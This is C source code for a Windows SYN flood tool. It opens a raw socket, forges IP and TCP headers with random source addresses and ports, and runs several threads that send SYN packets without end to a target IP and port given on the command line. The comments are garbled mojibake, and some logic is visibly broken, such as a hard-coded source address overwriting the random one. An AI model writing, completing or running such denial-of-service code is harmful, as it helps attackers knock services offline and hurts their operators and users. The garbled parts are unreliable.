#include <stdio.h> 
#include <winsock2.h> 
//#include <ws2tcpip.h> 
#include <time.h> 

#pragma  comment(lib,"ws2_32") 

#define IP_HDRINCL      2 /* header is included with data */

#define MAXLEN    10    //��ʼ�����ݰ��ĸ��� 

/////// ����ṹ�� ///////////////////////////// 
typedef struct ip_hdr //����IP�ײ� 
{ 
    unsigned char h_verlen; //4λ�ײ�����,4λIP�汾�� 
    unsigned char tos; //8λ��������TOS 
    unsigned short total_len; //16λ�ܳ��ȣ��ֽڣ� 
    unsigned short ident; //16λ��ʶ 
    unsigned short frag_and_flags; //3λ��־λ 
    unsigned char ttl; //8λ����ʱ�� TTL 
    unsigned char proto; //8λЭ�� (TCP, UDP ������) 
    unsigned short checksum; //16λIP�ײ�У��� 
    unsigned int sourceIP; //32λԴIP��ַ 
    unsigned int destIP; //32λĿ��IP��ַ 
}IPHEADER; 

typedef struct tsd_hdr //����TCPα�ײ� 
{ 
    unsigned long saddr; //Դ��ַ 
    unsigned long daddr; //Ŀ�ĵ�ַ 
    char mbz; 
    char ptcl; //Э������ 
    unsigned short tcpl; //TCP���� 
}PSDHEADER; 

typedef struct tcp_hdr //����TCP�ײ� 
{ 
    USHORT th_sport; //16λԴ�˿� 
    USHORT th_dport; //16λĿ�Ķ˿� 
    unsigned int th_seq; //32λ���к� 
    unsigned int th_ack; //32λȷ�Ϻ� 
    unsigned char th_lenres; //4λ�ײ�����/6λ������ 
    unsigned char th_flag; //6λ��־λ 
    USHORT th_win; //16λ���ڴ�С 
    USHORT th_sum; //16λУ��� 
    USHORT th_urp; //16λ��������ƫ���� 
}TCPHEADER; 

////////// �Ӻ������� ////////////////////////// 
void InitPacket(char *TargetIP, char *TargetPort);    //��ʼ�����ݰ� 
void usage(char *ProgName) ;                        //�����˵�˰� 
USHORT checksum(USHORT *buffer, int size) ;            //���Ҳ��˵�ˣ��Ǻ� 
int MakeThread(int s);                                //ѭ���������ݰ����̺߳��� 
unsigned long    MakeRand32(int i);                    //����32λ��������� 
unsigned short    MakeRand16(int i);                    //����16λ��������� 
inline unsigned __int64 GetCycleCount();            //��õ�ǰʱ���ǩ����ȷ��΢�뼶 
////////////////////////////////////////////// 


///////// ����ȫ�ֱ��� ///////////////////////// 
char    SendBuff[MAXLEN][68] = {0};         
SOCKADDR_IN    addr_in[MAXLEN]; 
SOCKET sock; 

int main(int argc, char* argv[]) 
{ 
    WSADATA    WSAData; 
    BOOL    flag; 
    HANDLE    ThreadHandle; 
    DWORD    ThreadID = 1; 
    int        nTimeOver,i; 
    int        ThreadCount = 10; 
     
    usage(argv[0]); 

    if (argc > 4 || argc < 3) 
    { 
        return 0; 
    } 
    if (argc == 4) 
    { 
        ThreadCount = atoi(argv[3]); 
    } 

    printf("Start to Init Buffer Table...\n\n"); 
    //��ʼ��ʼ�����ݰ� 
    InitPacket(argv[1],argv[2]); 
    printf("Init Buffer OK, Start to Send...\n"); 

    if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0) 
    { 
        printf("WSAStartup Error!\n"); 
        return 0; 
    } 

    //����socket 
    if ((sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED))==INVALID_SOCKET) 
    { 
        printf("Socket Setup Error!\n"); 
        return 0; 
    } 

    flag=1; 
    //����socket���Զ���IP���ݰ�ͷ 
    if (setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR) 
    { 
        printf("setsockopt IP_HDRINCL error!\n"); 
        return 0; 
    } 

    //���ó�ʱ 
    nTimeOver=1000; 
    if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&nTimeOver, sizeof(nTimeOver))==SOCKET_ERROR) 
    { 
    printf("setsockopt SO_SNDTIMEO error!\n"); 
    return 0; 
    } 

	InitPacket(argv[1],argv[2]); 


    //���������߳� 
    for(i = 0; i < ThreadCount; i++) 
    { 
        ThreadHandle = CreateThread(NULL, 
                                    0, 
                                    (LPTHREAD_START_ROUTINE)MakeThread, 
                                    (LPVOID)i, 
                                    0, 
                                    &ThreadID); 
        CloseHandle(ThreadHandle); 
        Sleep(10); 
    } 

    //ÿ30�����³�ʼ���������ݰ� 
    while(1) 
    { 
        Sleep(30000); 
        InitPacket(argv[1],argv[2]); 
    } 

    closesocket(sock); 
    WSACleanup(); 

    return 0; 
} 

void InitPacket(char *TargetIP, char *TargetPort) 
{ 
     
    IPHEADER ipHeader; 
    TCPHEADER tcpHeader; 
    PSDHEADER psdHeader; 

    int i; 

    unsigned long    srcip; 
    unsigned short    srcport,ident; 
    unsigned long    seqnum; 

    for(i = 0; i < MAXLEN; i++) 
    { 

        //�������ԴIP��ַ���жϣ�ֻȡB���C��IP��ַ 
        srcip = htonl(MakeRand32(i)); 
        while(((srcip & 0xe0000000) == 0xe0000000) || (srcip < 0x80000000)) 
        { 
            srcip = htonl(MakeRand32(i)); 
        } 
		srcip = htonl(inet_addr("192.168.1.5"));
        seqnum = MakeRand32(i); 
        srcport = MakeRand16(i); 

		ident = MakeRand16(i+7); 

        ZeroMemory((void *)SendBuff[i],68);     

        addr_in[i].sin_family=AF_INET; 
        addr_in[i].sin_port=htons(srcport); 
        addr_in[i].sin_addr.S_un.S_addr=htonl(srcip); 

        //���IP�ײ� 
        ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long)); 
        ipHeader.tos=0; 
        ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)); 
        ipHeader.ident= htonl(ident);
        ipHeader.frag_and_flags=0x40; 
        ipHeader.ttl=128; 
        ipHeader.proto=IPPROTO_TCP; 
        ipHeader.checksum=0; 
        ipHeader.sourceIP=htonl(srcip); 
        ipHeader.destIP=inet_addr(TargetIP); 

        //���TCP�ײ� 
        tcpHeader.th_dport=htons(atoi(TargetPort)); 
        tcpHeader.th_sport=htons(srcport); //Դ�˿ں� 
        tcpHeader.th_seq=htonl(seqnum); 
        tcpHeader.th_ack=0; 
        tcpHeader.th_lenres=((sizeof(tcpHeader))/4<<4|0); 
        tcpHeader.th_flag=2; //�޸�������ʵ�ֲ�ͬ�ı�־λ̽�⣬2��SYN��1��FIN��16��ACK̽�� 
        tcpHeader.th_win=~0; 
        tcpHeader.th_urp=0; 
        tcpHeader.th_sum=0; 

        psdHeader.saddr=ipHeader.sourceIP; 
        psdHeader.daddr=ipHeader.destIP; 
        psdHeader.mbz=0; 
        psdHeader.ptcl=IPPROTO_TCP; 
        psdHeader.tcpl=htons(sizeof(tcpHeader)); 

        //����У���
		
        memcpy(SendBuff[i], &psdHeader, sizeof(psdHeader)); 
        memcpy(SendBuff[i]+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
        memset(SendBuff[i]+sizeof(ipHeader)+sizeof(tcpHeader), 0, 8);
        tcpHeader.th_sum=checksum((USHORT *)SendBuff[i],sizeof(psdHeader)+sizeof(tcpHeader)); 

        memcpy(SendBuff[i], &ipHeader, sizeof(ipHeader)); 
        memcpy(SendBuff[i]+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
        ipHeader.checksum=checksum((USHORT *)SendBuff[i], sizeof(ipHeader)); 


   } 
         
} 

//CheckSum:����У��͵��Ӻ��� 
USHORT checksum(USHORT *buffer, int size) 
{ 
    unsigned long cksum=0; 
    while(size >1) 
    { 
        cksum+=*buffer++; 
        size -=sizeof(USHORT); 
    } 
    if(size ) 
    { 
        cksum += *(UCHAR*)buffer; 
    } 

    cksum = (cksum >> 16) + (cksum & 0xffff); 
    cksum += (cksum >>16); 
    return (USHORT)(~cksum); 
} 

void usage(char *ProgName) 
{ 
     
    printf("Usage: %s <IP> <PORT> [MaxThread (default:10)]\r\n",ProgName); 

} 


int MakeThread(int s) 
{ 
    int i, retval, totalcount=0; 
	fd_set FdW;
	struct timeval TimeOut;
	TimeOut.tv_sec = 0;
	TimeOut.tv_usec = 1;

    while(1) 
    { 
        i = 0; 

        //while(i < MAXLEN) 
        { 
			FD_ZERO(&FdW);
			FD_SET(sock,&FdW);

/*
			retval = select(sock+1,NULL,&FdW,NULL,&TimeOut);
			if(retval <= 0)
			{
				printf("select error: %d\r\n", GetLastError());
				return 0;
			}
*/
            retval = sendto(sock, SendBuff[i], sizeof(IPHEADER)+sizeof(TCPHEADER), 
            0, (struct sockaddr*)&(addr_in[i]), sizeof(addr_in[i])); 

			if(retval == SOCKET_ERROR)
			{
				printf("sendto error: %d\r\n", GetLastError());
				return 0;
			}
            i++; 
			++totalcount;
			printf("%6d \r", totalcount);
        } 
		if(totalcount%11 == 0)
			Sleep(1);
    } 
    return 1; 
} 

unsigned long MakeRand32(int i) 
{ 

   unsigned long j1,j2,s; 

   i = i << 15; 

   srand( (unsigned int)GetCycleCount() + i ); 

   j1 = rand(); 
   j2 = rand(); 

   j1 = j1 << 16; 

   s = j1+j2; 

   return s; 
} 

unsigned short MakeRand16(int i) 
{ 
    unsigned short s; 

    i = i << 15; 

    srand( (unsigned int)GetCycleCount() +i ); 
    s = rand(); 

    return s; 
} 

inline unsigned __int64 GetCycleCount() 
{ 
__asm _emit 0x0F 
__asm _emit 0x31
}
